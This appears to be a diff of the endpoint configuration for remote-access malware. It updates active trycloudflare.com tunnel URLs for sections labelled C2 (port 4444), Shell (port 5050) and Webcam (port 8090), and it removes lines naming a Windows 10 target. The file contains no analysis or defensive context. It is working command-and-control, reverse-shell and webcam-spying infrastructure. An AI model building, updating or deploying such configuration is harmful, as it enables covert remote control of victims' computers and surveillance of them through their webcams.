@@ -1,26 +1,20 @@
-# Tunnels Cloudflared - Mise à jour: 2025-08-08 18:10:57
-# Version: 3.2 - Windows Edition
-# OS: Windows 10
-# Architecture: AMD64
-# Python: 3.10.11
+# Tunnels Cloudflared - Mise à jour: 2025-08-12 09:45:42
+# Version: 3.1
 
 [C2]
-URL=https://yu-bermuda-gifts-forgotten.trycloudflare.com
+URL=https://warren-pennsylvania-retro-res.trycloudflare.com
 PORT=4444
 TYPE=socket
 STATUS=ACTIVE
-OS=Windows
 
 [Shell]
-URL=https://odds-it-fighter-heather.trycloudflare.com
+URL=https://chambers-pdf-rapidly-capability.trycloudflare.com
 PORT=5050
 TYPE=socket
 STATUS=ACTIVE
-OS=Windows
 
 [Webcam]
-URL=https://filling-explaining-owners-vhs.trycloudflare.com
+URL=https://subtle-wt-error-need.trycloudflare.com
 PORT=8090
 TYPE=flask
 STATUS=ACTIVE
-OS=Windows
